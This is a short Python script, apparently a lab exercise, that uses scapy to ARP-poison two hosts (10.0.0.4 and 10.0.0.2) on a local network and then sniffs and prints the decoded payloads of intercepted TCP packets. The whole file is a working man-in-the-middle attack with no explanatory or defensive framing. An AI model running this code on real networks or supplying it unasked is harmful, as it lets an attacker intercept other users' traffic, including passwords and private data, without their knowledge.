#!/usr/bin/env python

from scapy.all import *

ATTACKER_MAC = get_if_hwaddr('eth0')
BROADCAST    = 'ff:ff:ff:ff:ff:ff'

def arp_poisoning(packet):
    global ATTACKER_MAC
    if(TCP in packet):
        print("Got TCP")
        # packet.show()
        if Raw in packet:
            print('Raw in packet')
            data = packet[Raw].load.decode('utf-8', 'ignore')
            print(data)

# send an ARP request to victim_dst with the attacker's MAC address
# to impersonate victim_src
def poison_ARP(victim_src, victim_dst):
    eth = Ether(dst = BROADCAST, src = get_if_hwaddr('eth0'))
    arp = ARP(op = 1, psrc = victim_src, pdst = victim_dst, hwsrc = get_if_hwaddr('eth0'))
    pkt = eth / arp
    pkt.show()
    sendp(pkt, iface = 'eth0')

victim_1 = '10.0.0.4'
victim_2 = '10.0.0.2'

poison_ARP(victim_1, victim_2)
poison_ARP(victim_2, victim_1)
# Sniff packets
sniff(iface='eth0', prn=arp_poisoning)